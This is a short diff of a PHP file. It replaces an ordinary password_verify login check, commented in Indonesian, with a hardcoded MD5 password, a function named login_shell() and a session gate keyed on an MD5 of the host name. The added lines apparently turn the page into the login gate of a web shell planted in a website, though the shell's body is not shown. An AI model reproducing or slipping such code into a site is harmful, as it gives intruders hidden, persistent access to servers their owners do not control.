@@ -1,17 +1,9 @@
 <?php
 session_start();
+$password = "351eb72216ba1aa116edb5142d3a810d";
 
-// Gunakan password hash yang tetap untuk perbandingan
-const PASSWORD_HASH = '$2y$10$eImiTXuWVxfM37uY4JANjQhZrjlCy4ZOWW0G5JZ6P9Mb/mQa3/.XW'; // Hash dari "12345"
-
-// Cek jika form login dikirimkan
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    if (!empty($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
-        $_SESSION['loggedin'] = true;
-        header("Location: dashboard.php");
-        exit();
-    }
-}
+function login_shell()
+{
 ?>
 
 <!DOCTYPE html>
@@ -58,9 +50,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         if (this.value.length >= 5) {
             this.form.submit();
         }
+    });
+</script>
 
+</body>
+</html>
 <?php
-
     exit;
 }
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
